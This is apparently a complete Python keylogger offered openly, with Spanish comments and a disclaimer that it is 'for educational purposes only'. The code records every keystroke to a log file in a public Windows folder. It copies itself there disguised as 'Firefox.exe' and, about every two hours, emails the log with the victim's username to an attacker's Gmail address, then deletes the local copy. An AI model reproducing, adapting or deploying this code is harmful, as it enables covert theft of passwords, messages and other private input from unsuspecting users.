#################################################################
# Developer by SebastianEPH                                     #
#                                                               #
# Script creado solo con fines educativos.                      #
# No me hago responsable por un posible mal uso de éste script. #
#                                                               #
#################################################################

# Librerías Utilizadas
from pynput.keyboard import Key, Listener
import pynput
from getpass import getuser # Obtiene el nombre del usuario
from datetime import datetime
import datetime
import os
import yagmail
import shutil
# Librería verifica interent
import socket
import time
# Hilos
import threading

# Obtiene registro de teclas y lo guarda en un archivo
def Klogger():
    log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('C:\\Users\\Public\\log.txt')
    )
    mifecha = datetime.datetime.now()
    timi = "Fecha:      ["+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "]\nHora:       [" + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos]\n"

    with open (log, "a") as f:
        f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(timi)+"--------------------------------------------\n\n")

    def on_press(key):
        #print("-------")
        with open(log, "a") as f:
            if isinstance(key, pynput.keyboard.KeyCode): #convierte las teclas 0-9, a-z a codigo normal
                f.write('{}'.format(key.char))
            elif str(key) == "Key.space" :                                        
                f.write(' ')
            elif str(key) == "Key.backspace":                                           # Fixed Key.backspace
                f.write("[-]") 
            elif str(key) == "Key.enter":                                               # Fixed Key.enter
                f.write('\n') 
            elif str(key) == "Key.tab":                                               # Fixed Key.enter
                f.write('   ')
            elif str(key) == "´" or str(key) == "Key.caps_lock" or str(key) == "´" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(key) == "Key.ctrl_l" or str(key) == "Key.ctrl_r" or str(key) == "Key.cmd" or str(key) == "Key.alt_r" or str(key) == "Key.alt_l" or str(key) == "Key.left" or str(key) == "Key.up" or str(key) == "Key.right" or str(key) == "Key.down":
                pass 
            elif str(key) == "Key.print_screen" or str(key) == "Key.media_volume_up" or str(key) == "Key.media_volume_mute" or str(key) == "None" or str(key) == "Key.media_next" or str(key) == "Key.num_lock" or str(key) == "Key.media_volume_mute" or str(key) == "Key.media_previous" or str(key) == "Key.media_play_pause" :
                pass   
            else:
                f.write('{}'.format(key))

    with Listener(on_press=on_press) as listener:
        listener.join() 

# Envía los datos log por Gmail 
def sendLog(log):
    try:
        ## Change correo
        mifecha = datetime.datetime.now()
        sender_email = "SoyElCorreoQueEnviaráLosRegistrosDeTeclas@gmail.com"
        sender_password = "SoyUnaContraseña"

        receiver_email = ["SoyElQueRecibiráLosRegistros@gmail.com"]
        # Si deseas 2 a más destinatarios
        # receiver_email = ["correo1@gmail.com", "correo2@hotmail.com"]
        subject = "Dados del usuario: "+ str(getuser())
        yag = yagmail.SMTP(user=sender_email, password=sender_password)
        contenido = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
        contents = [ 
            "Información:\n\nNombre de Usuario: "+ str(getuser()) + contenido
        ]
        yag.send(receiver_email, subject, contents, attachments=log )
        print("**************Se envió****************")
        return True;
    except:
        print("___________________No se envió________________")
        return False

# Renombre el archivo log, antes de ser envíado
def Rename(name):
    try:
        
        # Copia el archivo 
        Original = "C:\\Users\\Public\\log.txt"
        New= "C:\\Users\\Public\\"+ name + ".txt"
        os.rename(Original, New)
    except:
        pass
# Verifica si hay conexión a internet para poder envíar el log
def VerificarConexion():
    #creamos el socket de conexion
    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #intenta conectarse a una url con el socket creado
    try:
        con.connect(('www.google.com', 80))
        #si funciona correctamente continua y ejecuta la salida en pantalla
        print ("online")
        return True 
    except:
        #si existe un error en la ejecucion del conector ejecuta la salidad de pantalla offline
        print ("offline")
        return False
    #cierra el conector
    con.close()

# Cópia él Keylogger a la carpeta oculta 
def CopyKey():
    nameKey = "Firefox.exe"
    filePath = "C:\\Users\\Public\\"+ nameKey

    try:
         #Verificar si el archivo se encuentra copiado en el sistema
        with open(filePath, 'r') as f:
            print("El keylogger ya se encuentra en la carpeta oculta")
    except :
        print("El Keylogger no se encuentra en la carpeta oculta")
        print("Se tratará de copiarlo")
        try:
            shutil.copy(nameKey , filePath)
            #Copia el keylogger a la carpeta especifica,
            #Solos si no existe
            print("Exito al copiar el keylogger a una carpeta oculta correctamente ")
        except:
            print("No se puedo copiar el keylogger en la carpeta oculta correctamente ")

# Intervalo de tiempo que se enviará el archivo log.txt
def mailInterval():
    n = 1   # Para renombre los archivos
    while (True):
        n = n+1
        # Enviar cada 2 horas aprox
        for x in range(720):    #720
            time.sleep(10)
        if VerificarConexion(): # Si hay conexión
            # Crea nombre del archivo
            nameFile = "log"+str(n)
            #Renombra el archivo original
            Rename(nameFile)    # para que las nuevas teclas se envien en el siguiente tomo

            #Envía el archivo renombrado
            homedir = 'C:\\Users\\Public\\'+str(nameFile)+".txt"
            print("Proceso de envío")

            # Verifica envío Correcto
            if sendLog(homedir):
                #Si se envíó correctamente, pues elimina el archivo
                os.remove(homedir)
            else:
                # Hay internet, pero no se puedo enviar,
                # por ende el problema pudo ser las credenciales del correo, 
                # asi que se enviará con otro correo
                # time.sleep(10)
                # Enviar con otro correo y credenciales
                pass

        else:   # No hay conexión
            # Seguirá sobreescribiendo el archivo
            # No hará nada, y esperará que aya una conexión exitosa
            pass

# Inicio multihilo
if __name__ == '__main__':
    # Copía el programa a una carpeta escondida 
    CopyKey()
    p1 = threading.Thread(target=Klogger)
    p2 = threading.Thread(target=mailInterval)
    p2.start()
    p1.start()
    p1.join()
